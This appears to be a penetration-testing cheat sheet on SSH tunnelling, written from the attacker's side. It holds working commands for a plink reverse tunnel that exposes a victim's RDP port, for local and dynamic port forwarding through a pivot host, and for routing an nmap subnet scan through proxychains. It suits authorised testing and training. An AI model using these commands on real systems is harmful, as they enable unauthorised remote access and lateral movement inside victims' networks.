## SSH Tunnels

### Reverse SSH Tunnel

*From the victim machine to our attacking box.*

```bash
plink -l root -pw <mypassword> <attacking.machine.ip.address> -R 3390:127.0.0.1:3389
```

### SSH Local Port Forwarding

```bash
ssh -L 0.0.0.0:4444:<attacking.machine.ip.address>:4444 <local_hostname>
```

```bash
ssh -L 10443:<victim.ip.address>:443 user@<pivot_host>
```

```bash
ssh -L 0.0.0.0:45001:<victim.ip.address>:80 user@<pivot_host>
```

### SSH Dynamic Port Forwarding

* Set a local listening port and have it tunnel incoming traffic to any remote destination through a socks proxy.
* SSH to create a socks4 proxy on our local attacking box and tunnel all incoming traffic to that port through DMZ network of our victim.
* Forward/Tunnel and redirect our traffic to the victim's machine.

```bash
ssh -f -N -D 9050 root@victim.example.com
```

* proxychains

```bash
nano /etc/proxychains.conf
```

* Content

```bash
[ProxyList]
#...
socks4 127.0.0.1 9050
```

* Run e.g. nmap

```bash
proxychains nmap -p 80 -sT -Pn x.x.x.0/24 --open
```
